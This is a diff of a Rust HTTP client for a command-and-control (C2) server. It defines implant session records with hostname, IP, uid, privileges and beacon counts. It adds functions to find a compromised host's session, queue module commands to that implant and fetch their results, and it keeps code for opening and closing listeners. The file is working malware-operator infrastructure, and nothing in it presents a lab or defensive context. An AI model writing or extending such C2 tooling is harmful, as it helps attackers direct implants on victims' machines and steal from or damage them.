@@ -1,11 +1,29 @@
 /// REST API client for the C2 server.
-use crate::app::{SessionInfo, SessionListResponse};
 use serde::{Deserialize, Serialize};
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct SessionDetailResponse {
-    pub session: SessionInfo,
-    pub command_history: Vec<CommandRecord>,
+pub struct SessionInfo {
+    pub implant_id: String,
+    pub hostname: String,
+    pub ip: String,
+    pub first_seen: String,
+    pub last_seen: String,
+    pub os: String,
+    pub arch: String,
+    pub uid: u32,
+    pub privileges: String,
+    pub tier: String,
+    pub status: String,
+    pub pending_commands: usize,
+    pub total_commands: u64,
+    pub beacon_count: u64,
+    pub protocol_version: u32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SessionListResponse {
+    pub sessions: Vec<SessionInfo>,
+    pub count: usize,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -22,11 +40,10 @@ pub struct CommandRecord {
 }
 
 #[derive(Debug, Serialize, Deserialize)]
-pub struct QueueCommandResponse {
-    pub command_id: String,
-    pub module: String,
-    pub action: String,
-    pub status: String,
+pub struct ListenerInfo {
+    pub port: u16,
+    pub protocol: String,
+    pub active: bool,
 }
 
 pub struct C2Client {
@@ -41,59 +58,49 @@ impl C2Client {
             .timeout(std::time::Duration::from_secs(10))
             .build()
             .expect("create http client");
-
-        C2Client {
-            base_url: base_url.trim_end_matches('/').to_string(),
-            client,
-        }
+        C2Client { base_url: base_url.trim_end_matches('/').to_string(), client }
     }
 
     pub async fn list_sessions(&self) -> Result<SessionListResponse, String> {
         let url = format!("{}/api/v1/sessions", self.base_url);
         let resp = self.client.get(&url).send().await.map_err(|e| e.to_string())?;
-        if !resp.status().is_success() {
-            return Err(format!("HTTP {}", resp.status()));
-        }
+        if !resp.status().is_success() { return Err(format!("HTTP {}", resp.status())); }
         resp.json().await.map_err(|e| e.to_string())
     }
 
-    pub async fn get_session(&self, id: &str) -> Result<SessionDetailResponse, String> {
-        let url = format!("{}/api/v1/sessions/{}", self.base_url, id);
-        let resp = self.client.get(&url).send().await.map_err(|e| e.to_string())?;
-        if !resp.status().is_success() {
-            return Err(format!("HTTP {}", resp.status()));
-        }
-        resp.json().await.map_err(|e| e.to_string())
+    /// Find a session by hostname or implant_id substring.
+    pub async fn find_session(&self, query: &str) -> Option<SessionInfo> {
+        if let Ok(resp) = self.list_sessions().await {
+            resp.sessions.into_iter().find(|s| {
+                s.hostname.contains(query) || s.implant_id.contains(query)
+            })
+        } else { None }
     }
 
-    pub async fn get_commands(&self, session_id: &str) -> Result<Vec<CommandRecord>, String> {
+    /// Shortcut: queue a command. Returns command_id or error string.
+    pub async fn queue(&self, session_id: &str, module: &str, action: &str,
+                       args: &serde_json::Value) -> Result<String, String> {
         let url = format!("{}/api/v1/sessions/{}/commands", self.base_url, session_id);
-        let resp = self.client.get(&url).send().await.map_err(|e| e.to_string())?;
-        if !resp.status().is_success() {
-            return Err(format!("HTTP {}", resp.status()));
-        }
-        resp.json().await.map_err(|e| e.to_string())
-    }
-
-    pub async fn queue_command(
-        &self,
-        session_id: &str,
-        module: &str,
-        action: &str,
-        args: &serde_json::Value,
-    ) -> Result<QueueCommandResponse, String> {
-        let url = format!("{}/api/v1/sessions/{}/commands", self.base_url, session_id);
-        let body = serde_json::json!({
-            "module": module,
-            "action": action,
-            "args": args,
-        });
+        let body = serde_json::json!({"module": module, "action": action, "args": args});
         let resp = self.client.post(&url).json(&body).send().await.map_err(|e| e.to_string())?;
         if !resp.status().is_success() {
             let err_body = resp.text().await.unwrap_or_default();
             return Err(format!("HTTP error: {}", err_body));
         }
-        resp.json().await.map_err(|e| e.to_string())
+        let r: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;
+        Ok(r["command_id"].as_str().unwrap_or("?").to_string())
+    }
+
+    /// Get the result data for a command, or None if still pending.
+    pub async fn command_result(&self, session_id: &str, command_id: &str) -> Option<serde_json::Value> {
+        let url = format!("{}/api/v1/sessions/{}/commands/{}", self.base_url, session_id, command_id);
+        let resp = self.client.get(&url).send().await.ok()?;
+        if !resp.status().is_success() { return None; }
+        let cmd: serde_json::Value = resp.json().await.ok()?;
+        let status = cmd.get("status")?.as_str()?;
+        if status == "completed" || status == "failed" {
+            cmd.get("result").cloned()
+        } else { None }
     }
 
     // ── Listener management ──────────────────────────────────────
@@ -101,9 +108,7 @@ impl C2Client {
     pub async fn get_listeners(&self) -> Result<Vec<ListenerInfo>, String> {
         let url = format!("{}/api/v1/listeners", self.base_url);
         let resp = self.client.get(&url).send().await.map_err(|e| e.to_string())?;
-        if !resp.status().is_success() {
-            return Err(format!("HTTP {}", resp.status()));
-        }
+        if !resp.status().is_success() { return Err(format!("HTTP {}", resp.status())); }
         resp.json().await.map_err(|e| e.to_string())
     }
 
@@ -112,8 +117,7 @@ impl C2Client {
         let body = serde_json::json!({"port": port, "protocol": protocol});
         let resp = self.client.post(&url).json(&body).send().await.map_err(|e| e.to_string())?;
         if !resp.status().is_success() {
-            let err_body = resp.text().await.unwrap_or_default();
-            return Err(format!("HTTP error: {}", err_body));
+            return Err(format!("HTTP error: {}", resp.text().await.unwrap_or_default()));
         }
         resp.json().await.map_err(|e| e.to_string())
     }
@@ -122,16 +126,8 @@ impl C2Client {
         let url = format!("{}/api/v1/listeners/{}", self.base_url, port);
         let resp = self.client.delete(&url).send().await.map_err(|e| e.to_string())?;
         if !resp.status().is_success() {
-            let err_body = resp.text().await.unwrap_or_default();
-            return Err(format!("HTTP error: {}", err_body));
+            return Err(format!("HTTP error: {}", resp.text().await.unwrap_or_default()));
         }
         Ok(())
     }
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ListenerInfo {
-    pub port: u16,
-    pub protocol: String,
-    pub active: bool,
 }
